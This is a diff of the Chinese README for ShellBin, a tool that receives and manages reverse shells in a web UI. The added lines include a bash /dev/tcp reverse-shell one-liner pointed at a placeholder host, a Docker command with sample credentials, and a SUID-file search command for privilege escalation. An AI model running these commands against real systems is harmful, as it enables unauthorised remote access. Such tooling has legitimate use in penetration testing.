@@ -1,29 +1,29 @@
 # ShellBin
 
-优雅地接收反向 shell。
+[中文文档](README_zh.md)
 
-在一个端口上接收多个反向 shell，并在 Web UI 中管理它们。
+优雅地接收反向 Shell。
 
-甚至可以使用 vi、tmux 命令（您可能需要获得 pty 并设置正确的stty尺寸）。
+在一个端口上接收多个反向 Shell，并在 Web UI 中进行管理。
 
-![screenshot](images/screenshot.png)
+借助 [xterm.js](https://xtermjs.org/) 的使用，复杂的命令如 vi、tmux 和 Ctrl-C 可以正常工作（您可能需要获取 pty，并设置正确的 stty 大小。）
+
+![屏幕截图](images/screenshot.png)
 
 ## 运行
 
-建议使用 Docker。
+建议使用来自 DockerHub 的 [docker 镜像](https://hub.docker.com/repository/docker/cwithw/shellbin)。
 
-```
-make backend-environment
-make frontend-environment
-make docker
+```bash
+docker run -d --name shellbin -p 9998:3000 -p 9999:3001 -e USERNAME=root -e PASSWORD=toor cwithw/shellbin:latest
 ```
 
-将 `docker` 文件夹复制到您的 VPS 上，并运行 `docker compose up -d --build`。
+将 `USERNAME` 和 `PASSWORD` 的值更改为您自己的用户名和密码。
+您还可以将 `9998`（Web UI 端口）和 `9999`（反向 Shell 端口）更改为您自己的端口。
 
-您可能需要更改 `docker/config/config.yml`，其中包含用户名和密码（默认为 admin:admin）。
+然后访问 `http://your-ip:9998` 以查看 Web UI。
 
-您可能还想更改 `docker/docker-compose.yml` 中的端口（默认为 9998:3000 和 9999:3001）。
-
+在端口 `9999` 上接收反向 Shell（`bash -i >& /dev/tcp/your-ip/9999 0>&1`）。
 
 ## 开发
 
@@ -32,22 +32,29 @@ make backend-environment
 make frontend-environment
 ```
 
-## 构建 Docker
+## 构建 Docker 镜像
 
 ```
 make docker
 ```
+```
+make build-docker-image
+```
 
-## 安全性和性能
 
-此应用程序处于原型阶段，通常是安全的，但未经过性能优化，UI 也不太美观，欢迎提交 pull requests。
+## 安全性与性能
+
+该应用程序处于原型阶段，通常是安全的，但性能未经优化，UI 也不够美观，
+
+欢迎提交拉取请求。
 
 ## 路线图
 
-- [x] Web UI，显示连接的 shell 列表，并使用 [xterm.js](https://xtermjs.org/) 显示彩色 shell
+- [x] 具有连接的反向 Shell 列表的 Web UI，并使用 [xterm.js](https://xtermjs.org/) 显示彩色 Shell
 - [x] Web UI 需要身份验证
-- [x] 接收反向 shell
-- [x] 自动删除死连接
-- [ ] 炫酷的 Web UI
-- [ ] 调整终端大小并发送事件
-- [ ] 代码片段
+- [x] 接收反向 Shell
+- [x] 自动删除断开的连接
+- [ ] 时尚的 Web UI
+- [ ] 调整终端大小并发送终端事件（目前需要执行 `stty` 命令）
+- [ ] 代码片段（例如 `find / -perm 4000 2>/dev/null`）
+- [ ] API管理
